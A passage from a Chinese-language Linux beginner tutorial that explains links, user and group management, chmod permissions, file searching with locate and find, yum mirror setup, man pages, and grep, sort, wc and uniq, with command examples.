bash"><span class="hljs-built_in">ln</span> -s file1 file2<br></code></pre></td></tr></table></figure><p><img src="640wx_fmt=jpeg&random=0.8882761106001003&random=0.613835830105667&random=0.8422128463882474&random=0.jpeg" alt="图片"></p><p>执行 <code>ls -l</code> 命名查看当前目录下文件的具体信息</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">total 0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>Jan<span class="hljs-number"> 14 </span>06:29 file1<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5 </span>Jan<span class="hljs-number"> 14 </span>06:42 file2 -&gt; file1  <span class="hljs-comment"># 表示file2 指向 file1</span><br></code></pre></td></tr></table></figure><p>其实 <code>file2</code> 只是 <code>file1</code> 的一个快捷方式，它指向的是 <code>file1</code> ，所以显示的是 file1 的内容，但其实 <code>file2</code> 的 <code>inode</code> 与 <code>file1</code> 并不相同。如果我们删除了 <code>file2</code> 的话，<code>file1</code> 是不会受影响的，但如果删除 <code>file1</code> 的话， <code>file2</code> 就会变成死链接，因为指向的文件不见了。</p><p>**用户与权限<br>**</p><p><strong>用户</strong></p><p><code>Linux</code> 是一个多用户的操作系统。在 <code>Linux</code> 中，理论上来说，我们可以创建无数个用户，但是这些用户是被划分到不同的群组里面的，有一个用户，名叫 <code>root</code> ，是一个很特殊的用户，它是超级用户，拥有最高权限。</p><p><img src="640wx_fmt=jpeg&random=0.5212440182460254&random=0.6340509087960582&random=0.508820799954437&random=0.jpeg" alt="图片"></p><p>自己创建的用户是有限权限的用户，这样大大提高了 <code>Linux</code> 系统的安全性，有效防止误操作或是病毒攻击，但是我们执行的某些命令需要更高权限时可以使用 <code>sudo</code> 命令。</p><p><strong>sudo</strong>：以 <code>root</code> 身份运行命令</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">sudo <span class="hljs-built_in">date</span>  <span class="hljs-comment">--&gt; 当然查看日期是不需要sudo的这里只是演示，sudo 完之后一般还需要输入用户密码的</span><br></code></pre></td></tr></table></figure><p><strong>useradd + passwd</strong></p><ul><li><code>useradd</code> 添加新用户</li><li><code>passwd</code>  修改用户密码</li></ul><p>这两个命令需要 root 用户权限</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">useradd</span> lion --&gt;</span> 添加一个lion用户，添加完之后在 /home 路径下可以查看<br><span class="hljs-function"><span class="hljs-title">passwd</span> lion --&gt;</span> 修改lion用户的密码<br></code></pre></td></tr></table></figure><p><strong>userdel****：</strong>删除用户，需要 root 用户权限</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">userdel</span> lion --&gt;</span> 只会删除用户名，不会从/home中删除对应文件夹<br><span class="hljs-function"><span class="hljs-title">userdel</span> lion -r --&gt;</span> 会同时删除/home下的对应文件夹<br></code></pre></td></tr></table></figure><p><strong>su</strong>：切换用户，需要 root 用户权限</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo su --&gt; 切换为root用户（<span class="hljs-keyword">exit</span> 命令或 CTRL + D 快捷键都可以使普通用户切换为 root 用户）<br>su lion --&gt; 切换为普通用户<br>su - --&gt; 切换为root用户<br></code></pre></td></tr></table></figure><p><strong>群组的管理</strong></p><p>Linux 中每个用户都属于一个特定的群组，如果你不设置用户的群组，默认会创建一个和它的用户名一样的群组，并且把用户划归到这个群组。</p><p><strong>groupadd</strong>：创建群组，用法和 useradd 类似。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">groupadd friends</span><br></code></pre></td></tr></table></figure><p><strong>groupdel</strong>：删除一个已存在的群组</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">groupdel</span> foo  --&gt;</span> 删除foo群组<br></code></pre></td></tr></table></figure><p><strong>groups</strong>：查看用户所在群组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">groups</span> lion  <span class="hljs-comment">--&gt; 查看 lion 用户所在的群组</span><br></code></pre></td></tr></table></figure><p><strong>usermod</strong>：用于修改用户的账户。</p><p>【<strong>常用参数</strong>】</p><ul><li><code>-l</code> 对用户重命名。需要注意的是 <code>/home</code> 中的用户家目录的名字不会改变，需要手动修改。 </li><li><code>-g</code> 修改用户所在的群组，例如 <code>usermod -g friends lion</code> 修改 <code>lion</code> 用户的群组为 <code>friends</code> 。 </li><li><code>-G</code> 一次性让用户添加多个群组，例如 <code>usermod -G friends,foo,bar lion</code> 。 </li><li><code>-a</code> <code>-G</code> 会让你离开原先的群组，如果你不想这样做的话，就得再添加 <code>-a</code> 参数，意味着 <code>append</code> 追加的意思。 </li></ul><p><strong>chgrp</strong>：用于修改文件的群组。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">chgrp bar <span class="hljs-built_in">file</span>.txt <span class="hljs-comment">--&gt; file.txt文件的群组修改为bar</span><br></code></pre></td></tr></table></figure><p><strong>chown</strong>：改变文件的所有者，需要 root 身份才能运行。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">chown lion <span class="hljs-built_in">file</span>.txt <span class="hljs-comment">--&gt; 把其它用户创建的file.txt转让给lion用户</span><br>chown lion:bar <span class="hljs-built_in">file</span>.txt <span class="hljs-comment">--&gt; 把file.txt的用户改为lion，群组改为bar</span><br></code></pre></td></tr></table></figure><p>【<strong>常用参数</strong>】</p><ul><li><code>-R</code> 递归设置子目录和子文件，<code>chown -R lion:lion /home/frank</code> 把 <code>frank</code> 文件夹的用户和群组都改为 <code>lion</code> 。</li></ul><p><strong>文件权限管理</strong></p><p><strong>chmod</strong>：修改访问权限。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">740</span> file.txt<br></code></pre></td></tr></table></figure><p>【<strong>常用参数</strong>】</p><ul><li><code>-R</code> 可以递归地修改文件访问权限，例如 <code>chmod -R 777 /home/lion</code></li></ul><p>修改权限的确简单，但是理解其深层次的意义才是更加重要的。下面我们来系统的学习 Linux 的文件权限。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@lion ~]<span class="hljs-comment"># ls -l</span><br>drwxr-xr-x<span class="hljs-number"> 5 </span>root root<span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 13 </span><span class="hljs-number"> 2020 </span>climb<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 7 </span>Jan<span class="hljs-number"> 14 </span>06:41 hello2.c -&gt; hello.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 149 </span>Jan<span class="hljs-number"> 13 </span>06:14 hello.c<br></code></pre></td></tr></table></figure><p>其中 <code>drwxr-xr-x</code> 表示文件或目录的权限。让我们一起来解读它具体代表什么？</p><ul><li><code>d</code> ：表示目录，就是说这是一个目录，普通文件是 - ，链接是 l 。 </li><li><code>r</code> ：<code>read</code> 表示文件可读。 </li><li><code>w</code> ：<code>write</code> 表示文件可写，一般有写的权限，就有删除的权限。 </li><li><code>x</code> ：<code>execute</code> 表示文件可执行。 </li><li><code>-</code> ：表示没有相应权限。 </li></ul><p>权限的整体是按用户来划分的，如下图所示：</p><p><img src="640wx_fmt=jpeg&random=0.9128325654773546&random=0.2634696345918439&random=0.2947447442804241&random=0.jpeg" alt="图片"></p><p>现在再来理解这句权限 <code>drwxr-xr-x</code> 的意思：</p><ul><li>它是一个文件夹； </li><li>它的所有者具有：读、写、执行权限； </li><li>它的群组用户具有：读、执行的权限，没有写的权限； </li><li>它的其它用户具有：读、执行的权限，没有写的权限。 </li></ul><p>现在理解了权限，我们使用 chmod 来尝试修改权限。chmod 它不需要是 root 用户才能运行的，只要你是此文件所有者，就可以用 chmod 来修改文件的访问权限。</p><p><strong>数字分配权限</strong></p><table><thead><tr><th>权限</th><th>数字</th></tr></thead><tbody><tr><td>r</td><td>4</td></tr><tr><td>w</td><td>2</td></tr><tr><td>x</td><td>1</td></tr></tbody></table><p>因此要改变权限，只要做一些简单的加法就行：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">chmod<span class="hljs-number"> 640 </span>hello.c <br><br><span class="hljs-comment"># 分析</span><br>6 =<span class="hljs-number"> 4 </span>+<span class="hljs-number"> 2 </span>+<span class="hljs-number"> 0 </span>表示所有者具有 rw 权限<br>4 =<span class="hljs-number"> 4 </span>+<span class="hljs-number"> 0 </span>+<span class="hljs-number"> 0 </span>表示群组用户具有 r 权限<br>0 =<span class="hljs-number"> 0 </span>+<span class="hljs-number"> 0 </span>+<span class="hljs-number"> 0 </span>表示其它用户没有权限<br><br>对应文字权限为：-rw-r--<span class="language-yaml"><span class="hljs-meta">---</span></span><br></code></pre></td></tr></table></figure><p><strong>用字母来分配权限</strong></p><ul><li><code>u</code> ：user 的缩写，用户的意思，表示所有者。 </li><li><code>g</code> ：group 的缩写，群组的意思，表示群组用户。 </li><li><code>o</code> ：other 的缩写，其它的意思，表示其它用户。 </li><li><code>a</code> ：all 的缩写，所有的意思，表示所有用户。 </li><li><code>+</code> ：加号，表示添加权限。 </li><li><code>-</code> ：减号，表示去除权限。 </li><li><code>=</code> ：等于号，表示分配权限。</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">chmod u+rx <span class="hljs-built_in">file</span> <span class="hljs-comment">--&gt; 文件file的所有者增加读和运行的权限</span><br>chmod g+r <span class="hljs-built_in">file</span> <span class="hljs-comment">--&gt; 文件file的群组用户增加读的权限</span><br>chmod o-r <span class="hljs-built_in">file</span> <span class="hljs-comment">--&gt; 文件file的其它用户移除读的权限</span><br>chmod g+r o-r <span class="hljs-built_in">file</span> <span class="hljs-comment">--&gt; 文件file的群组用户增加读的权限，其它用户移除读的权限</span><br>chmod go-r <span class="hljs-built_in">file</span> <span class="hljs-comment">--&gt; 文件file的群组和其他用户移除读的权限</span><br>chmod +x <span class="hljs-built_in">file</span> <span class="hljs-comment">--&gt; 文件file的所有用户增加运行的权限</span><br>chmod u=rwx,g=r,o=- <span class="hljs-built_in">file</span> <span class="hljs-comment">--&gt; 文件file的所有者分配读写和执行的权限，群组其它用户分配读的权限，其他用户没有任何权限</span><br></code></pre></td></tr></table></figure><p><strong>查找文件</strong></p><p><strong>locate</strong>：搜索包含关键字的所有文件和目录。后接需要查找的文件名，也可以用正则表达式。</p><p><strong>安装locate</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">yum</span> -y install mlocate --&gt;</span> 安装包<br><span class="hljs-function"><span class="hljs-title">updatedb</span> --&gt;</span> 更新数据库<br>locate file.txt<br>locate fil*.txt<br></code></pre></td></tr></table></figure><p>[<strong>注意</strong>] locate 命令会去文件数据库中查找命令，而不是全磁盘查找，因此刚创建的文件并不会更新到数据库中，所以无法被查找到，可以执行 updatedb 命令去更新数据库。</p><p><strong>find</strong>：用于查找文件，它会去遍历你的实际硬盘进行查找，而且它允许我们对每个找到的文件进行后续操作，功能非常强大。</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">find <span class="hljs-attribute">&lt;何处&gt;</span> <span class="hljs-attribute">&lt;何物&gt;</span> <span class="hljs-attribute">&lt;做什么&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>何处</strong>：指定在哪个目录查找，此目录的所有子目录也会被查找。 </li><li><strong>何物</strong>：查找什么，可以根据文件的名字来查找，也可以根据其大小来查找，还可以根据其最近访问时间来查找。 </li><li><strong>做什么</strong>：找到文件后，可以进行后续处理，如果不指定这个参数， find 命令只会显示找到的文件。 </li></ul><p><strong>根据文件名查找</strong></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;file.txt&quot;</span> --&gt; 当前目录以及子目录下通过名称查找文件<br><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;syslog&quot;</span> --&gt; 当前目录以及子目录下通过名称查找文件<br><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;syslog&quot;</span> --&gt; 整个硬盘下查找syslog<br><span class="hljs-built_in">find</span> /var/<span class="hljs-built_in">log</span> -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;syslog&quot;</span> --&gt; 在指定的目录/var/<span class="hljs-built_in">log</span>下查找syslog文件<br><span class="hljs-built_in">find</span> /var/<span class="hljs-built_in">log</span> -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;syslog*&quot;</span> --&gt; 查找syslog1、syslog2 ... 等文件，通配符表示所有<br><span class="hljs-built_in">find</span> /var/<span class="hljs-built_in">log</span> -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*syslog*&quot;</span> --&gt; 查找包含syslog的文件 <br></code></pre></td></tr></table></figure><p>[<strong>注意</strong>] find 命令只会查找完全符合 “何物” 字符串的文件，而 locate 会查找所有包含关键字的文件。</p><p><strong>根据文件大小查找</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/var -size +10M --&gt; /</span>var 目录下查找文件大小超过 <span class="hljs-number">10</span>M 的文件<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/var -size -50k --&gt; /</span>var 目录下查找文件大小小于 <span class="hljs-number">50</span>k 的文件<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/var -size +1G --&gt; /</span>var 目录下查找文件大小查过 <span class="hljs-number">1</span>G 的文件<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/var -size 1M --&gt; /</span>var 目录下查找文件大小等于 <span class="hljs-number">1</span>M 的文件<br></code></pre></td></tr></table></figure><p><strong>根据文件最近访问时间查找</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> -name <span class="hljs-string">&quot;*.txt&quot;</span> -atime -<span class="hljs-number">7</span>  --&gt; 近 <span class="hljs-number">7</span>天内访问过的.txt结尾的文件<br></code></pre></td></tr></table></figure><p><strong>仅查找目录或文件</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">find . -name <span class="hljs-string">&quot;file&quot;</span> -<span class="hljs-keyword">type</span> <span class="hljs-type">f  </span><span class="hljs-comment">--&gt; 只查找当前目录下的file文件</span><br>find . -name <span class="hljs-string">&quot;file&quot;</span> -<span class="hljs-keyword">type</span> <span class="hljs-type">d  </span><span class="hljs-comment">--&gt; 只查找当前目录下的file目录</span><br></code></pre></td></tr></table></figure><p><strong>操作查找结果</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">find -name <span class="hljs-string">&quot;*.txt&quot;</span> -<span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;%p - %u\n&quot;</span> --&gt; 找出所有后缀为txt的文件，并按照 %p - %u\n 格式打印，其中%p=文件名，%u=文件所有者<br>find -name <span class="hljs-string">&quot;*.jpg&quot;</span> -<span class="hljs-keyword">delete</span> --&gt; 删除当前目录以及子目录下所有.jpg为后缀的文件，不会有删除提示，因此要慎用<br>find -name <span class="hljs-string">&quot;*.c&quot;</span> -<span class="hljs-keyword">exec</span> <span class="hljs-keyword">chmod</span> <span class="hljs-number">600</span> &#123;&#125; \; --&gt; 对每个.c结尾的文件，都进行 -<span class="hljs-keyword">exec</span> 参数指定的操作，&#123;&#125; 会被查找到的文件替代，\; 是必须的结尾<br>find -name <span class="hljs-string">&quot;*.c&quot;</span> -ok <span class="hljs-keyword">chmod</span> <span class="hljs-number">600</span> &#123;&#125; \; --&gt; 和上面的功能一直，会多一个确认提示<br></code></pre></td></tr></table></figure><p><strong>软件仓库</strong></p><p>Linux 下软件是以包的形式存在，一个软件包其实就是软件的所有文件的压缩包，是二进制的形式，包含了安装软件的所有指令。Red Hat 家族的软件包后缀名一般为 .rpm ， Debian 家族的软件包后缀是 .deb 。</p><p>Linux 的包都存在一个仓库，叫做软件仓库，它可以使用 yum 来管理软件包， yum 是 CentOS 中默认的包管理工具，适用于 Red Hat 一族。可以理解成 Node.js 的 npm 。</p><p><strong>yum 常用命令</strong></p><ul><li><code>yum update | yum upgrade</code> 更新软件包 </li><li><code>yum search xxx</code> 搜索相应的软件包 </li><li><code>yum install xxx</code> 安装软件包 </li><li><code>yum remove xxx</code> 删除软件包 </li></ul><p><strong>切换 CentOS 软件源</strong></p><p>有时候 CentOS 默认的 yum 源不一定是国内镜像，导致 yum  在线安装及更新速度不是很理想。这时候需要将 yum 源设置为国内镜像站点。国内主要开源的镜像站点是网易和阿里云。</p><p>1、首先备份系统自带 yum 源配置文件 <code>mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</code> </p><p>2、下载阿里云的 yum 源配置文件到 <code>/etc/yum.repos.d/CentOS7</code> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -O <span class="hljs-regexp">/etc/yum</span>.repos.d<span class="hljs-regexp">/CentOS-Base.repo http:/</span><span class="hljs-regexp">/mirrors.aliyun.com/</span>repo/Centos-<span class="hljs-number">7</span>.repo<br></code></pre></td></tr></table></figure><p>3、生成缓存</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yum makecache</span><br></code></pre></td></tr></table></figure><p><strong>阅读手册</strong></p><p>Linux  命令种类繁杂，我们凭借记忆不可能全部记住，因此学会查用手册是非常重要的。</p><p><strong>man</strong></p><p><strong>安装更新 man</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">sudo</span> yum install -y man-pages --&gt;</span> 安装<br><span class="hljs-function"><span class="hljs-title">sudo</span> mandb --&gt;</span> 更新<br></code></pre></td></tr></table></figure><p><strong>man 手册种类</strong></p><ol><li>可执行程序或 <code>Shell</code> 命令； </li><li>系统调用（ Linux 内核提供的函数）； </li><li>库调用（程序库中的函数）； </li><li>文件（例如 <code>/etc/passwd</code> ）； </li><li>特殊文件（通常在 <code>/dev</code> 下）； </li><li>游戏； </li><li>杂项（<code>man(7)</code> ，<code>groff(7)</code> ）； </li><li>系统管理命令（通常只能被 <code>root</code> 用户使用）； </li><li>内核子程序。 </li></ol><p><strong>man + 数字 + 命令</strong></p><p>输入 man + 数字 + 命令/函数，可以查到相关的命令和函数，若不加数字， man 默认从数字较小的手册中寻找相关命令和函数</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">man <span class="hljs-number">3</span> <span class="hljs-keyword">rand</span>  --&gt; 表示在手册的第三部分查找 <span class="hljs-keyword">rand</span> 函数<br>man <span class="hljs-keyword">ls</span>    --&gt; 查找 <span class="hljs-keyword">ls</span> 用法手册<br></code></pre></td></tr></table></figure><p>man 手册核心区域解析：(以 <code>man pwd</code> 为例)</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">NAME <span class="hljs-comment"># 命令名称和简单描述</span><br>     pwd <span class="hljs-comment">-- return working directory name</span><br><br>SYNOPSIS <span class="hljs-comment"># 使用此命令的所有方法</span><br>     pwd [-L | -P]<br><br>DESCRIPTION <span class="hljs-comment"># 包括所有参数以及用法</span><br>     The pwd utility writes <span class="hljs-keyword">the</span> absolute pathname <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> current working <span class="hljs-built_in">directory</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> standard output.<br><br>     Some shells may provide <span class="hljs-keyword">a</span> builtin pwd <span class="hljs-keyword">command</span> <span class="hljs-title">which</span> <span class="hljs-title">is</span> <span class="hljs-title">similar</span> <span class="hljs-title">or</span> <span class="hljs-title">identical</span> <span class="hljs-title">to</span> <span class="hljs-title">this</span> <span class="hljs-title">utility</span>.  <span class="hljs-title">Consult</span> <span class="hljs-title">the</span> <span class="hljs-title">builtin</span>(<span class="hljs-title">1</span>) <span class="hljs-title">manual</span> <span class="hljs-title">page</span>.<br><br>     The options are <span class="hljs-keyword">as</span> follows:<br><br>     -L      Display <span class="hljs-keyword">the</span> logical current working <span class="hljs-built_in">directory</span>.<br><br>     -P      Display <span class="hljs-keyword">the</span> physical current working <span class="hljs-built_in">directory</span> (all symbolic links resolved).<br><br>     If no options are specified, <span class="hljs-keyword">the</span> -L option is assumed.<br><br>SEE ALSO <span class="hljs-comment"># 扩展阅读相关命令</span><br>     builtin(<span class="hljs-number">1</span>), cd(<span class="hljs-number">1</span>), csh(<span class="hljs-number">1</span>), sh(<span class="hljs-number">1</span>), getcwd(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><strong>help</strong></p><p>man 命令像新华词典一样可以查询到命令或函数的详细信息，但其实我们还有更加快捷的方式去查询，<code>command --help</code> 或 <code>command -h</code> ，它没有 man 命令显示的那么详细，但是它更加易于阅读。</p><p>Linux 进阶</p><p><strong>文本操作</strong></p><p><strong>grep</strong></p><p>全局搜索一个正则表达式，并且打印到屏幕。简单来说就是，在文件中查找关键字，并显示关键字所在行。</p><p><strong>基础语法</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> text <span class="hljs-keyword">file</span> # text代表要搜索的文本，<span class="hljs-keyword">file</span>代表供搜索的文件<br><br># 实例<br>[root@lion ~]# <span class="hljs-keyword">grep</span> path <span class="hljs-regexp">/etc/</span>profile<br>pathmunge () &#123;<br>    pathmunge <span class="hljs-regexp">/usr/</span>sbin<br>    pathmunge <span class="hljs-regexp">/usr/</span>local/sbin<br>    pathmunge <span class="hljs-regexp">/usr/</span>local/sbin after<br>    pathmunge <span class="hljs-regexp">/usr/</span>sbin after<br>unset -f pathmunge<br></code></pre></td></tr></table></figure><p><strong>常用参数</strong></p><ul><li><code>-i</code> 忽略大小写，<code>grep -i path /etc/profile</code> </li><li><code>-n</code> 显示行号， <code>grep -i path /etc/profile</code> </li><li><code>-v</code> 只显示搜索文本不在的那些行，<code>grep -v path /etc/profile</code></li><li><code>-r</code> 递归查找，<code>grep -r hello /etc</code> ，Linux 中还有一个 rgrep 命令，作用相当于 <code>grep -r</code> </li></ul><p><strong>高级用法</strong></p><p><code>grep</code> 可以配合正则表达式使用。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">grep</span> -E <span class="hljs-built_in">path</span> /etc/profile --&gt;</span> 完全匹配<span class="hljs-built_in">path</span><br><span class="hljs-function"><span class="hljs-title">grep</span> -E ^<span class="hljs-built_in">path</span> /etc/profile --&gt;</span> 匹配<span class="hljs-built_in">path</span>开头的字符串<br><span class="hljs-function"><span class="hljs-title">grep</span> -E [Pp]ath /etc/profile --&gt;</span> 匹配<span class="hljs-built_in">path</span>或Path<br></code></pre></td></tr></table></figure><p><strong>sort</strong></p><p>对文件的行进行排序。</p><p><strong>基础语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span> name.txt <span class="hljs-comment"># 对name.txt文件进行排序</span><br></code></pre></td></tr></table></figure><p><strong>实例用法</strong></p><p>为了演示方便，我们首先创建一个文件 name.txt ，放入以下内容：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Christopher</span><br><span class="hljs-attribute">Shawn</span><br><span class="hljs-attribute">Ted</span><br><span class="hljs-attribute">Rock</span><br><span class="hljs-attribute">Noah</span><br><span class="hljs-attribute">Zachary</span><br><span class="hljs-attribute">Bella</span><br></code></pre></td></tr></table></figure><p>执行 <code>sort name.txt</code> 命令，会对文本内容进行排序。</p><p><strong>常用参数</strong></p><ul><li><code>-o</code> 将排序后的文件写入新文件，<code>sort -o name_sorted.txt name.txt</code> ； </li><li><code>-r</code> 倒序排序，<code>sort -r name.txt</code> ； </li><li><code>-R</code> 随机排序，<code>sort -R name.txt</code> ； </li><li><code>-n</code> 对数字进行排序，默认是把数字识别成字符串的，因此 138 会排在 25 前面，如果添加了 -n 数字排序的话，则 25 会在 138 前面。 </li></ul><p><strong>wc</strong></p><p><code>word count</code> 的缩写，用于文件的统计。它可以统计单词数目、行数、字符数，字节数等。</p><p><strong>基础语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">wc</span> name.txt <span class="hljs-comment"># 统计name.txt</span><br></code></pre></td></tr></table></figure><p><strong>实例用法</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@lion</span> ~]<span class="hljs-meta"># wc name.txt </span><br><span class="hljs-number">13</span> <span class="hljs-number">13</span> <span class="hljs-number">91</span> name.txt<br></code></pre></td></tr></table></figure><ul><li>第一个13，表示行数； </li><li>第二个13，表示单词数； </li><li>第三个91，表示字节数。 </li></ul><p><strong>常用参数</strong></p><ul><li><code>-l</code> 只统计行数， <code>wc -l name.txt</code> ； </li><li><code>-w</code> 只统计单词数，<code>wc -w name.txt</code> ； </li><li><code>-c</code> 只统计字节数，<code>wc -c name.txt</code> ； </li><li><code>-m</code> 只统计字符数，<code>wc -m name.txt</code> 。 </li></ul><p><strong>uniq</strong></p><p>删除文件中的重复内容。</p><p><strong>基础语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uniq</span> name.txt <span class="hljs-comment"># 去除name.txt重复的行数，并打印到屏幕上</span><br><span class="hljs-built_in">uniq</span> name.txt uniq_name.txt <span class="hljs-comment"># 把去除重复后的文件保存为 uniq_name.txt</span><br></code></pre></td></tr></table></figure><p>【<strong>注意</strong>】它只能去除连续重复的行数。</p><p><strong>常用参数</strong></p><ul><li><code>-c</code> 统计重复行数， <code>uniq -c name.txt</code>；</li><li><code>-d</code> 只显示重复的行数， <code>uniq -d name.txt</code> 。</li></ul><p><strong>cut</strong></p><p>剪切文件的一部分内容。</p><p><strong>基础语法</strong></p><figure class="highlight apache"><table><tr><td 